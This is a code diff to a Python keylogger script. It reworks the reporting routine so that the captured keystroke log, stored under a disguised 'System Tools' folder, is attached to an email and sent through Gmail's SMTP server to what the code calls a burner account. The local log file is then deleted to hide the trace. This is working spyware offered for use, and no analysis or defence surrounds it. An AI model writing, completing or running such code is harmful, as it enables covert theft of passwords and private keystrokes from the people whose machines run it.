@@ -7,6 +7,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.application import MIMEApplication
 from email import encoders
+from email.message import EmailMessage
 
 from threading import Timer
 from datetime import datetime
@@ -121,23 +122,18 @@ class Keylogger:
     # sends report as email
     # **************************
     def report_mail(self):
-        msg = MIMEMultipart(mixed)
+        msg = EmailMessage()
         msg['From'] = EMAILA
         msg['To'] = EMAILA
         msg['Subject'] = self.filename
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(self.log)
-        encoders.encode_base64(part)
-        path = 'C:\\Users\\Public\\Public Documents\\System Tools\\'
-        with open(path, "rb") as attachment:
-            a = MIMEApplication(attachment.read(), subtype='txt')
-
-        msg.attach(a)
+        msg.set_content("")
+        msg.add_attachment(open(f"C:\\Users\\Public\\Public Documents\\System Tools\\{self.filename}", encoding="utf8").read())
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # connect to email SMTP server
         server.starttls()  # starts TLS mode
         server.login(EMAILA, EMAILP)  # logs in to burner email account
-        server.sendmail(EMAILA, EMAILA, msg.as_string())  # sends mail to itself
+        server.send_message(msg)  # sends mail to itself
         server.quit()  # disconnects from SMTP server
+        os.remove(f"C:\\Users\\Public\\Public Documents\\System Tools\\{self.filename}")
 
 
 # **************************
@@ -147,4 +143,4 @@ if __name__ == "__main__":
     keylogger = Keylogger()
     keylogger.start()
 
-# one more try
+# aw yeah babyyyyyyyy
